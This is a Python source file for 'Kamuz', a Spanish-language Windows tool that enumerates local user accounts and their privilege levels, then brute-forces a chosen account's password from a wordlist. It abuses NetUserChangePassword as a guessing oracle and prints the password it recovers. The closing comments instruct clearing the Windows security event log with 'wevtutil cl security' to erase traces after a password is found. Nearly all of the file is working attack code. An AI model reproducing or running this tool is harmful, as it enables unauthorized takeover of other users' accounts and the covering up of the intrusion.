
# -*- coding: utf8 -*-

# Python: 3
#
#          ██╗  ██╗ █████╗ ███╗   ███╗██╗   ██╗███████╗
#          ██║ ██╔╝██╔══██╗████╗ ████║██║   ██║╚══███╔╝
#          █████╔╝ ███████║██╔████╔██║██║   ██║  ███╔╝ 
#          ██╔═██╗ ██╔══██║██║╚██╔╝██║██║   ██║ ███╔╝  
#          ██║  ██╗██║  ██║██║ ╚═╝ ██║╚██████╔╝███████╗
#          ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝
#                                                         By: LawlietJH
#                                                               v1.0.4


import msvcrt
import os, sys, time
import win32net as WN
import pywintypes
from tkinter import filedialog, Tk



Banner = """

                  ██╗  ██╗ █████╗ ███╗   ███╗██╗   ██╗███████╗
                  ██║ ██╔╝██╔══██╗████╗ ████║██║   ██║╚══███╔╝
                  █████╔╝ ███████║██╔████╔██║██║   ██║  ███╔╝ 
                  ██╔═██╗ ██╔══██║██║╚██╔╝██║██║   ██║ ███╔╝  
                  ██║  ██╗██║  ██║██║ ╚═╝ ██║╚██████╔╝███████╗
                  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝
                                                         By: LawlietJH
                                                               v1.0.4\
"""

Tk().withdraw()

#=======================================================================
#=======================================================================
#=======================================================================


def GetFileName():
	
	Nombre = filedialog.askopenfile(initialdir = os.getcwd(),
									title = "Selecciona Un Diccionario",
									filetypes = (("Archivos de Texto","*.txt"),("Todos los Archivos","*.*")))
	
	if Nombre == None: return
	
	return Nombre.name


def Progreso(x, Total, Palabra):	# Imprime Una Barra De Progreso.
	
	TamBar = 0
	Progreso = (x * 100) / Total
	Actual = x / Total
	
	TiempoTransc = int(time.clock()) + 1
	BarraAct = int(Actual * TamBar)
	
	bar = '\r Progreso: {:.2f}%'.format(Progreso)
	# ~ bar += ' |' + '█'.join(["" for _ in range(BarraAct)])  # Imprimir Progreso.
	# ~ bar += ' '.join(['' for _ in range(int(TamBar - BarraAct))]) + '|'
	bar += ' [' + Tiempo((Total - x) * (TiempoTransc / x))  + '] '	# Imprimir Tiempo Restante.
	bar += '[{}/{}] - Probando: {}\t\t'.format(x, Total, Palabra)
	
	try: sys.stdout.write(bar)
	except UnicodeEncodeError: return False


def Tiempo(sec):	# Imprime El Tiempo Restante.
	
	if sec >= 31449600000:  # Convierte a Milenios
		return "{:d} Milenio(s)".format(int(sec / 31449600000))
	elif sec >= 3144960000:  # Convierte a Siglos
		return "{:d} Siglo(s)".format(int(sec / 3144960000))
	elif sec >= 314496000:  # Convierte a Decadas
		return "{:d} Decada(s)".format(int(sec / 314496000))
	elif sec >= 31449600:  # Convierte a Años
		return "{:d} año(s)".format(int(sec / 31449600))
	elif sec >= 604800:  # Convierte a Semanas
		return "{:d} Semana(s)".format(int(sec / 604800))
	elif sec >= 86400:  # Convierte a Dias
		return "{:d} Dia(s)".format(int(sec / 86400))
	elif sec >= 3600:  # Convierte a Horas
		return "{:d} hora(s)".format(int(sec / 3600))
	elif sec >= 60:  # Convierte a Minutos
		return "{:d} minuto(s)".format(int(sec / 60))
	else:            # Sin Conversión
		return "{:d} segundo(s)".format(int(sec))


def Barra(Actual, Total, Pass):	# Función Que Controla La Velocidad Al Imprimir En Pantalla La Barra De Progreso.
	
	if Total > 1 and Total <= 1000 :
		if Actual % 5 == 0: Progreso(Actual, Total, Pass)
	elif Total > 1000 and Total <= 100000 :
		if Actual % 50 == 0: Progreso(Actual, Total, Pass)
	elif Total > 100000 and Total <= 1000000 :
		if Actual % 500 == 0: Progreso(Actual, Total, Pass)
	elif Total > 1000000 and Total <= 10000000:
		if Actual % 5000 == 0: Progreso(Actual, Total, Pass)
	elif Total > 10000000:
		if Actual % 50000 == 0: Progreso(Actual, Total, Pass)


#=======================================================================
#=======================================================================
#=======================================================================


# Función Que Limpia El Buffer (Hace Flush) Para Que los Input Aparescan En Limpio Siempre.
# Ya Que Si Se Escribe A La 'Nada' Antes De Un Input, Todo Lo Escrito Aparecera En El Input.
# Con Esta Función Se Evita Eso.

def Imp():	# Limpia El Buffer (Flush)
    
    try:
        
        import msvcrt
        
        while msvcrt.kbhit(): msvcrt.getch()
        
    except ImportError:
		
        import sys, termios
        
        termios.tcflush(sys.stdin, termios.TCIOFLUSH)


def GetChar(Cadena=''):		# Permite Capturar 1 Caracter Que se Escriba en Pantalla,
							# Como un Input() pero de 1 solo caracter.
	Imp()
	
	print(Cadena, end='')
	Resp = msvcrt.getch()
	if Resp == b'\x03': print('Saliendo...')
	else: print(str(Resp).replace('b\'','').replace('\'',''))
	
	return Resp


#=======================================================================
#=======================================================================
#=======================================================================


def ChangePasswordUser(oldPassword, newPassword, Usuario=None):
	
	WN.NetUserChangePassword(None, Usuario, oldPassword, newPassword)


def IsAdmin(Usuario):
	
	Valor = WN.NetUserGetInfo(None, Usuario, 1)['priv']
	
	return str(Valor)


def PasswdTime(Usuario):
	
	seg   = WN.NetUserGetInfo(None, Usuario, 1)['password_age']
	mins  = seg   // 60
	horas = mins  // 60
	dias  = horas // 24
	anios = dias  // 365
	
	return [anios, dias%365, horas%24, mins%60, seg%60]


def GetUsersName():
	
	Users = []
	UsersEnum = WN.NetUserEnum(None, 1)
	for x in UsersEnum[0]: Users.append(x['name'])
	
	return Users

#=======================================================================
#=======================================================================
#=======================================================================


def GetUserData(Usuario):
	
	# ~ os.system('Cls')
	# ~ print('\n\n\n ==============================================================================')
	print('\n\n     [~] Nombre de Usuario: ' + Usuario)
	print('\n     [~] Nivel de Privilegios:', ('2 (Admin)' if IsAdmin(Usuario) == '2' else ('1 (Sin Privilegios)' if IsAdmin(Usuario) == '1' else '0 (Invitado)')))
	print('\n     [~] Grupo:', WN.NetUserGetLocalGroups(None, Usuario , 0)[0])
	print('\n     [~] La Contraseña Fue Cambiada Por Última Ves Hace:\n\n\t [*] ', end='')
	
	PT = PasswdTime(Usuario)
	
	if PT[0] != 0: print(PT[0],'Años,', end=' ')
	if PT[1] != 0: print(PT[1],'Dias,', end=' ')
	if PT[2] != 0: print(PT[2],'Horas,', end=' ')
	if PT[3] != 0: print(PT[3],'Minutos,', end=' ')
	if PT[4] != 0: print(PT[4],'Segundos.')
	else: print('Nunca.')
	# ~ print('\n ==============================================================================')


#=======================================================================


def InformacionDeUsuarios():
	
	Users = GetUsersName()
	
	while True:
		
		print(Banner)
		Cont = 1
		Opc = 0
		
		print('\n [+] Lista de Usuarios Existentes:\n')
		
		for x in Users:
			
			print('\n\t [*]', Cont, '-' ,x,\
				('(Admin)' if IsAdmin(x) == '2'\
				else ('(Sin Privilegios)' if IsAdmin(x) == '1'\
				else '(Invitado)')))
			
			Cont += 1
		
		try:
			
			Opc = GetChar('\n\n [+] Escoge Un Usuario Para Atacar: ')
			Opc = int(Opc)
		
		except ValueError:
			
			if Opc == b'\x03':
				time.sleep(2)
				sys.exit(1)
			else:
				
				print('\n\n\t\t Elige una Opción Valida.\n\n')
				time.sleep(2)
			
			os.system('Cls')
			continue
			
		if Opc > len(Users) or Opc <= 0:
			
			print('\n\n\t\t Elige una Opción Valida.\n\n')
			time.sleep(2)
			os.system('Cls')
			continue
		
		break
	
	Usuario = Users[Opc-1]
	
	GetUserData(Usuario)
	
	return Usuario
	
	# Datos de Pruebas:
	
	# ~ print(WN.NetUserGetGroups(None, Usuario))
	# ~ print(WN.NetGroupGetUsers(None,'Ninguno', 0))
	# ~ print(WN.NetGroupEnum(None, 1))
	# ~ print(WN.NetUseEnum(None, 1))
	# ~ print(WN.NetGetJoinInformation())


#=======================================================================


def FuerzaBruta(Usuario):
	
	Words = []
	Actual = 1
	
	sys.stdout.write('\n\n [+] Abriendo Diccionario!')
	
	while True:
		
		Diccio = GetFileName()
		
		if Diccio == None:
			
			print('\n\n\t No Elegiste Ningun Archivo')
			os.system('Pause > Nul')
			return
		
		try: open(Diccio,'r')
		except:
			
			print('\n\n\t No se puede Abrir el Archivo ' + Diccio.split('.')[-1].upper())
			time.sleep(2)
			continue
		
		break
	
	with open(Diccio,'r',errors='ignore') as File: Words = File.readlines()
	Total = len(Words)
	
	sys.stdout.write('\r [+] Al Ataque!\t\t\t\n\n\n')
	
	for Passwd in Words:
		
		Passwd = Passwd.replace('\n','')
		
		try:
			
			ChangePasswordUser(Passwd, Passwd, Usuario)
			return Passwd
		
		except KeyboardInterrupt:
			
			print('\n\n\t [!] Cancelando...!')
			time.sleep(2)
			return
			
		except pywintypes.error as error:
			
			Err = error.__str__().replace('(','').replace(')','').replace('\'','').split(', ')[0]
			
			if int(Err) == 86:
				if Progreso(Actual, Total, Passwd) == False:
					sys.stdout.write('\r [!] Los Archivos .'+ Diccio.split('.')[-1].upper() +' No Son Compatibles.\t\t\t\t\t\t\t')
					os.system('Pause > Nul')
					return
				Actual += 1
			if int(Err) == 5:
				# ~ print('\n\n El Usuario \'' + Usuario + '\' Nego El Acceso (Código 5).\n\n')
				return False
				
	print('\n\n [!] La Contraseña no se Encontro en el Diccionario!')
	os.system('Pause > Nul')


def Main():
	
	os.system('MODE CON cols=80 lines=40')
	
	PassWD = ''
	os.system('Cls')
	
	Usuario = InformacionDeUsuarios()
	
	Opc = GetChar('\n\n [+] Quieres Atacar a Este Usuario? [S/N]: ')
	
	if Opc.lower() in [b's',b'y']:
		
		os.system('MODE CON cols=100 lines=32')
		
		try:
			os.system('Cls')
			print(Banner)
			GetUserData(Usuario)
			PassWD = FuerzaBruta(Usuario)
			
		except KeyboardInterrupt:
			print('\n\n\t [!] Cancelando...!')
			time.sleep(2)
			return
			
	else: return
	
	if PassWD == None: return
	if PassWD == False:
		
		print('\n\n El Usuario \'' + Usuario + '\' No Tiene Contraseña.\n\n')
		os.system('Pause > Nul')
		return
	
	print('\n\n\n Password del Usuario \'' + Usuario + '\': ' + PassWD)
	
	os.system('Pause > Nul')



if __name__ == '__main__':
	
	while True: Main()
	
	# Cambiando La Contraseña De Usuario Para Pruebas:
	# ~ try:
		
		# ~ Usuario = 'EnyLaine'
		# ~ ActPass = '99'
		# ~ NewPass = '12'
		
		# ~ ChangePasswordUser(ActPass, NewPass, Usuario)
		
		# ~ print('\n\n Password del Usuario \'' + Usuario + '\' Cambiada Por: ' + NewPass)
	
	# ~ except pywintypes.error as error:
		
		# ~ Err = error.__str__().replace('(','').replace(')','').replace('\'','').split(', ')[0]
		
		# ~ if int(Err) == 86: print('\n\n \'' + ActPass + '\' No es La Contraseña Actual del Usuario \'' + Usuario + '\'. (Código 86)')
		# ~ if int(Err) == 5: print('\n\n El Usuario \'' + Usuario + '\' Nego El Acceso (Código 5).')


# Datos Extras:

# Usar desde CMD como Administrador el Comando 'wevtutil cl security' despues de encontrar la contraseña de algun Usuario, para borrar la Huella.

# Comandos y Explicación:

# Listar Registros de Logs: wevtutil el
# Leer la configuración del registro security: wevtutil gl security
# Leer la información de estado del registro security: wevtutil gli security
# Borrar el registro security: wevtutil cl security

